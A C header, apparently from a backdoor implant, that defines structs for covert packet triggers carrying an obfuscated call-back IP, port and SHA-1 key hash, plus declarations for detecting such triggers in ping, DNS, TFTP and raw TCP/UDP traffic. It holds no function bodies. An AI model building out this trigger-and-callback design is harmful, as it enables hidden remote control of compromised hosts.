#ifndef _DT_PAYLOAD_H
#define _DT_PAYLOAD_H

#include "function_strings.h"    //Required for Solaris

#define TFTP_WRQ_OPCODE 2



// Constants for raw TCP and UDP triggers
#define	MIN_PACKET_SIZE		126
#define	MAX_PACKET_SIZE		472
#define START_PAD		8
#define CRC_DATA_LENGTH		84
#define RANDOM_PAD1		200
#define RANDOM_PAD2		146
#define PAD1			8
#define PAD2			8

#define ID_KEY_HASH_SIZE	20	// Size of SHA-1 hash
#define ID_KEY_LENGTH_MIN	8	// Minimum character length for a trigger key

/*! \struct Payload
 *
 * 	\brief	Payload data structure
 *
 * 	\param in_addr_t callback_addr	- Call-back IP address
 * 	\param uint16_t callback_port	- Call-back port
 * 	\param uint8_t trigger_key	- Trigger key (SHA-1)
 * 	\param uint16_t crc		- CRC of payload
 */
typedef struct __attribute__((packed))
{
	uint8_t		seed;				// Obfuscation seed used for triggers other than raw TCP/UDP.
	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
	uint8_t		idKey_hash[ID_KEY_HASH_SIZE];	// ID Key hash
	uint16_t	crc;				// CRC of this payload
} Payload;

typedef struct __attribute__((packed))
{
	int		delay;				// Trigger delay
	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
	uint16_t	trigger_port;			// for raw triggers, the TCP or UDP port
	uint8_t		idKey_hash[ID_KEY_HASH_SIZE];	// SHA-1 of ID key
} TriggerInfo;

// begin macros for RAW pkt processing
#define IDO_MAXPACKET (64 * 1024)

#include <sys/types.h>

//#include <inttypes.h>  //Not supported by windows, used <stdint.h> instead above

#ifndef IPPROTO_TCP
#define IPPROTO_TCP	6
#endif 

#ifndef IPPROTO_UDP
#define IPPROTO_UDP	17
#endif 

#ifndef IPPROTO_ICMP
#define IPPROTO_ICMP	1
#endif


// taken from linux/if_ether.h, 
struct ethhdr_t {
  uint8_t		h_dest[6];	/* destination eth addr	*/
  uint8_t		h_source[6];	/* source ether addr	*/
  uint16_t		h_proto;	/* packet type ID field	*/
}
#if defined LINUX || defined SOLARIS
	__attribute__((packed))
#endif
	;

#if defined LINUX

#if __BYTE_ORDER == __LITTLE_ENDIAN
#define _LITTLE_ENDIAN
#undef	_BIG_ENDIAN

#elif __BYTE_ORDER == __BIG_ENDIAN
#undef	_LITTLE_ENDIAN

#ifndef _BIG_ENDIAN
#define	_BIG_ENDIAN
#endif

#else
# error " ERROR: Fix <bits/endian.h>"
#endif	// BYTE_ORDER

#endif	//LINUX

#if defined SOLARIS
#include <sys/isa_defs.h>
#endif

struct iphdr_t
{ 
#if defined _LITTLE_ENDIAN
  uint8_t ihl:4,		/* header length */
	    version:4;		/* version */
#elif defined _BIG_ENDIAN
  uint8_t version:4,	/* version */
			ihl:4;			/* header length */
#else
#endif
  uint8_t tos;			/* type of service */
  uint16_t tot_len;			/* total length */
  uint16_t id;			/* identification */
  uint16_t frag_off;			/* fragment offset field */
  uint8_t ttl;			/* time to live */
  uint8_t protocol;				/* protocol */
  uint16_t checksum;			/* checksum */
  uint32_t saddr;
  uint32_t daddr; /* source and dest address */
}
#if defined LINUX || defined SOLARIS
	__attribute__((packed))
#endif
	;

struct icmphdr_t {
  uint8_t type;
  uint8_t code;
  uint16_t chksum;
  uint16_t id; //both id and seq can have different values depending on type
  uint16_t seq;
}
#if defined LINUX || defined SOLARIS
	__attribute__((packed))
#endif
	;

struct udphdr_t {
  uint16_t	source;
  uint16_t	dest;
  uint16_t	len;
  uint16_t	check;
}
#if defined LINUX || defined SOLARIS
	__attribute__((packed))
#endif
	;

struct tcphdr_t {
	uint16_t	source;
	uint16_t	dest;
	uint32_t    seq;
	uint32_t	ack;
	
#if defined _LITTLE_ENDIAN
	uint8_t	    unused:4;
	uint8_t     tcphdrleng:4;
#endif
#if defined _BIG_ENDIAN
	uint8_t	    tcphdrleng:4;
	uint8_t     unused:4;
#endif 
	uint8_t     flags;
	uint16_t	winsize;
	uint16_t	check;
	uint16_t	urgpntr;
}
#if defined LINUX || defined SOLARIS
	__attribute__((packed))
#endif
	;


#define packet_is_icmp( p )			\
  ( (p).ip.protocol == IPPROTO_ICMP )

#define packet_get_icmp( p ) 			\
  ( packet_is_icmp(p) ? (struct icmphdr_t*)( (p).data + ( ((p).ip.ihl * 4) - sizeof(struct iphdr_t)) ) : NULL) 

#define packet_is_udp( p )			\
  ( (p).ip.protocol == IPPROTO_UDP )

#define packet_get_udp( p )						\
  ( packet_is_udp(p) ? (struct udphdr_t*)( (p).data + ( ((p).ip.ihl * 4) - sizeof(struct iphdr_t)) ) : NULL) 




// provide a struct interfaces for the packet using the header structs.

struct __ido_eth_packet_t
{
  struct ethhdr_t		eth;
  struct iphdr_t		ip;
  unsigned char		data[ IDO_MAXPACKET - sizeof( struct ethhdr_t ) - sizeof ( struct iphdr_t ) ];
}
#if defined LINUX || defined SOLARIS
	__attribute__((packed))
#endif
	;
typedef struct __ido_eth_packet_t 	packet_ll_t;

struct __ido_ip_packet_t
{
  struct iphdr_t		ip;
  unsigned char		data[ IDO_MAXPACKET - sizeof( struct ethhdr_t ) - sizeof ( struct iphdr_t ) ];
}
#if defined LINUX || defined SOLARIS
	__attribute__((packed))
#endif
	;
typedef struct __ido_ip_packet_t 	packet_ip_t;


// BEGIN FUNC DECLS
int 
dt_signature_check( unsigned char*  pkt, int len, Payload* p);

int
dt_ping_request_received( struct icmphdr_t * icmp, Payload* p ) ;

int
dt_ping_reply_received( struct icmphdr_t * icmp, Payload* p );
int 
dt_error_received( struct icmphdr_t * icmp, Payload* p);

int
dt_tftp_received( struct udphdr_t * udp, Payload* p);

int
deobfuscate_payload( Payload * p);

int
dt_dns_received( struct udphdr_t * udp, Payload* p);

int
dt_raw_udp( struct udphdr_t * udp, uint16_t pktlen, Payload* p);

int
dt_raw_tcp( struct tcphdr_t * tcp, uint16_t pktlen, Payload* p);

int
raw_check(uint8_t *data, uint16_t pktlen, Payload* p);

int
payload_to_trigger_info (Payload *p, TriggerInfo *ti);

void
displaySha1Hash(char *label, unsigned char *sha1Hash);

#endif // _DT_PAYLOAD
